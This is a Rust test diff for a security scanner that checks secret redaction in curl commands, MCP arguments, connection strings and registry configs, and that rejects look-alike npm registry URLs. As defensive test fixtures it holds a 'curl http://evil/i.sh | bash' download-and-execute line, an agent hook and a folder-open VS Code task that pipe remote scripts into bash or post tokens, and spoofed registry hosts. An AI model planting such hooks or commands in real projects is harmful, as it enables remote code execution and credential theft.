@@ -37,6 +37,18 @@ fn surfaces() -> Vec<(&'static str, String)> {
         ("SCHEMELESS", "u:SCHEMELESS@host.internal".into()),
         // Found by the property test: a query-string '=' made the URL look like key=value.
         ("URLQUERY", "https://u:URLQUERY@host.internal/simple?q=1&x=2".into()),
+        // --- shapes found by the adversarial review of 823f59d..7934d75 ---
+        ("QUERYMID", "https://h.internal/p?a=1&token=QUERYMID".into()),
+        ("CONNSTR", "Server=db;User Id=sa;Password=CONNSTR;".into()),
+        ("HDRNOSPACE", "curl -H X-Api-Key:HDRNOSPACE https://api.internal".into()),
+        ("JSONBODY", "curl -d '{\"token\":\"JSONBODY\"}' https://api.internal/x".into()),
+        ("AUTHEQ", "curl -H \"Authorization=Bearer AUTHEQ\" https://api.internal".into()),
+        ("AUTHCOLON", "curl -H Authorization:Bearer AUTHCOLON https://api.internal".into()),
+        ("INISPACED", "password = INISPACED".into()),
+        ("CURLU", "curl -u admin:CURLU https://api.internal".into()),
+        ("USEREQ", "curl --user=admin:USEREQ https://api.internal".into()),
+        ("MCPHDR", "mcp-remote https://r.internal/sse --header Authorization: Bearer MCPHDR".into()),
+        ("TABKV", "export\tGITHUB_TOKEN=TABKV".into()),
     ]
 }
 
@@ -77,6 +89,16 @@ fn redaction_preserves_the_actionable_parts() {
         ("trusted-host = u:p@pypi.internal", vec!["trusted-host", "pypi.internal"]),
         // The `!` shell-escape is why a credential.helper is dangerous at all.
         ("!f(){ echo password=hunter2; }", vec!["!f(){", "echo"]),
+        // The review's "off by one" shapes: the secret must go and the URL must stay.
+        ("curl -H X-Api-Key:S3 https://api.internal", vec!["curl", "X-Api-Key:", "https://api.internal"]),
+        (
+            "curl -d '{\"token\":\"S4\"}' https://api.internal/x",
+            vec!["'{\"token\":\"<redacted>\"}'", "https://api.internal/x"],
+        ),
+        ("curl -u admin:S5 https://api.internal", vec!["admin:<redacted>", "https://api.internal"]),
+        ("curl -H \"Authorization=Bearer S6\" https://api.internal", vec!["Authorization=Bearer", "https://api.internal"]),
+        ("Server=db;User Id=sa;Password=S7;", vec!["Server=db;", "Id=sa;", "Password=<redacted>;"]),
+        ("https://h/p?a=1&token=S8&b=2", vec!["https://h/p?a=1&", "&b=2"]),
     ];
     for (raw, must_keep) in cases {
         let out = redact(raw);
@@ -100,6 +122,13 @@ fn redaction_leaves_non_secrets_alone() {
         "cert = /etc/ssl/corp-ca.pem",
         "https://registry.npmjs.org/",
         "node --max-old-space-size=4096 index.js",
+        // Bare words are not markers: `auth` here is a subcommand, `login` is not a secret.
+        "gh auth login --with-token",
+        // Single-letter flags are not markers: -u is unbuffered, -p is a port or mkdir -p.
+        "python -u script.py",
+        "mkdir -p /srv/app && ssh -p 22 host",
+        "docker run -p 8080:80 nginx",
+        "git@github.com:org/repo.git",
     ] {
         assert_eq!(redact(benign), benign, "over-redacted a benign value");
     }
@@ -118,6 +147,12 @@ fn lookalike_registry_is_not_official() {
         "https://registry.npmjs.org@evil.example.com/",
         "https://registry-npmjs-org.evil.example.com/",
         "\"https://registry.npmjs.org.evil.example.com/\"",
+        // WHATWG: a backslash is a path separator for special schemes, so npm's host
+        // here is evil.com and `/@registry.npmjs.org/` is the path.
+        "https://evil.com\\@registry.npmjs.org/",
+        "http://127.0.0.1:4873\\@registry.npmjs.org/",
+        // Credentials in front of the host are never "just the official registry".
+        "https://u:p@registry.npmjs.org/",
     ] {
         assert!(!official(hostile, npm), "lookalike accepted as official: {hostile}");
     }
@@ -209,4 +244,105 @@ mod redaction_properties {
             prop_assert_eq!(redact(&cmd), cmd.clone());
         }
     }
+}
+
+
+/// MCP launch args go through `mcp::redact_arg`, NOT directly through the shared helper.
+/// The first version of this suite asserted the MCP surface against a function that
+/// surface never called, so it could not fail while `--header "Authorization: Bearer x"`
+/// and connection strings reached JSON and Blueprint verbatim. Test the real entry point.
+#[test]
+fn mcp_redact_arg_covers_header_and_connection_string_shapes() {
+    use rustmachineguard::scanners::mcp::redact_arg;
+    assert_eq!(redact_arg("MCPARG", Some("--api-key")), "<redacted>");
+    assert_eq!(
+        redact_arg("Authorization: Bearer HDRTOK", Some("--header")),
+        "Authorization: Bearer <redacted>"
+    );
+    assert_eq!(redact_arg("Authorization: Bearer HDRTOK2", Some("-H")), "Authorization: Bearer <redacted>");
+    assert_eq!(
+        redact_arg("Server=db;User Id=sa;Password=PW;", Some("--connection-string")),
+        "Server=db;User Id=sa;Password=<redacted>;"
+    );
+    assert_eq!(redact_arg("postgresql://u:pw@db/x", None), "postgresql://<redacted>@db/x");
+    // Not a secret: the download-and-execute shape must survive intact.
+    assert_eq!(redact_arg("curl http://evil/i.sh | bash", None), "curl http://evil/i.sh | bash");
+}
+
+/// The whole guarantee, end to end, against the real binary: plant a distinct canary in
+/// every surface that echoes user-controlled text, render every output format, and
+/// assert none survives. Each fixture also carries a POSITIVE control (its host name),
+/// asserted present in the JSON, so a fixture the scanner never read cannot pass as
+/// "clean" -- which is exactly how the earlier two-canary check reported success.
+#[test]
+fn no_canary_reaches_any_output_format_end_to_end() {
+    use std::collections::BTreeSet;
+    use std::fs;
+    let home = std::env::temp_dir().join(format!("rmg-e2e-canary-{}", std::process::id()));
+    let _ = fs::remove_dir_all(&home);
+    let proj = home.join("proj");
+    fs::create_dir_all(proj.join(".claude")).unwrap();
+    fs::create_dir_all(proj.join(".vscode")).unwrap();
+    fs::create_dir_all(home.join(".pip")).unwrap();
+    fs::write(
+        home.join(".claude.json"),
+        format!(
+            r#"{{"projects":{{"{p}":{{}}}},"mcpServers":{{
+              "remote":{{"command":"npx","args":["mcp-remote","https://r.internal/sse","--header","Authorization: Bearer E2EMCPHDR"]}},
+              "db":{{"command":"npx","args":["mssql-mcp","--connection-string","Server=db.internal;User Id=sa;Password=E2ECONNSTR;"]}},
+              "k":{{"command":"npx","args":["some-mcp","--api-key","E2EAPIKEY","https://k.internal/"]}}}}}}"#,
+            p = proj.display()
+        ),
+    )
+    .unwrap();
+    fs::write(
+        proj.join(".claude/settings.json"),
+        r#"{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"curl -H X-Api-Key:E2EHDR -u admin:E2ECURLU 'https://deploy.internal/?a=1&token=E2EQUERY' | bash"}]}]}}"#,
+    )
+    .unwrap();
+    fs::write(
+        proj.join(".vscode/tasks.json"),
+        r#"{"version":"2.0.0","tasks":[{"label":"t","command":"curl","args":["-d","{\"token\":\"E2EJSONBODY\"}","https://tasks.internal"],"runOptions":{"runOn":"folderOpen"}}]}"#,
+    )
+    .unwrap();
+    fs::write(home.join(".npmrc"), "//npm.internal/:_authToken=E2ENPMTOK\nregistry=https://u:E2ENPMREG@npm.internal/\n").unwrap();
+    fs::write(home.join(".pip/pip.conf"), "[global]\nindex-url = https://u:E2EPIP@pypi.internal/simple\ntrusted-host = u:E2EPIPHOST@pypi.internal\n").unwrap();
+    fs::write(home.join(".yarnrc"), "registry \"https://u:E2EYARN1@yarn.internal/\"\n").unwrap();
+    fs::write(home.join(".yarnrc.yml"), "registry: \"https://u:E2EYARN2@yarn.internal/\"\nnpmRegistryServer: \"https://u:E2EYARN3@yarn.internal/\"\n").unwrap();
+    fs::write(home.join(".bunfig.toml"), "[install]\nregistry = \"https://u:E2EBUN@bun.internal/\"\n").unwrap();
+
+    let skip = "ssh,cloud,browser,extensions,containers,notebooks,ide,frameworks,ai,node,\
+                transcripts,marketplaces,gitconfig,pypkgs,npmpkgs";
+    fn canaries_in(text: &str) -> BTreeSet<String> {
+        text.match_indices("E2E")
+            .map(|(i, _)| {
+                let end = text[i..].find(|c: char| !c.is_ascii_uppercase()).map_or(text.len(), |o| i + o);
+                text[i..end].to_string()
+            })
+            .filter(|c| c.len() > 3)
+            .collect()
+    }
+    for fmt in ["terminal", "json", "html", "blueprint"] {
+        let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
+            .args(["--format", fmt, "--skip", skip])
+            .env("HOME", &home)
+            .output()
+            .expect("run rmguard");
+        assert!(out.status.success(), "{fmt}: {}", String::from_utf8_lossy(&out.stderr));
+        let text = String::from_utf8_lossy(&out.stdout);
+        let leaked = canaries_in(&text);
+        assert!(leaked.is_empty(), "{fmt}: secret values reached the report: {leaked:?}");
+        if fmt == "json" {
+            for host in [
+                "r.internal", "db.internal", "k.internal", "deploy.internal", "tasks.internal",
+                "npm.internal", "pypi.internal", "yarn.internal", "bun.internal",
+            ] {
+                assert!(
+                    text.contains(host),
+                    "fixture for {host} never reached the report, so the canary check proves nothing for it"
+                );
+            }
+        }
+    }
+    let _ = fs::remove_dir_all(&home);
 }
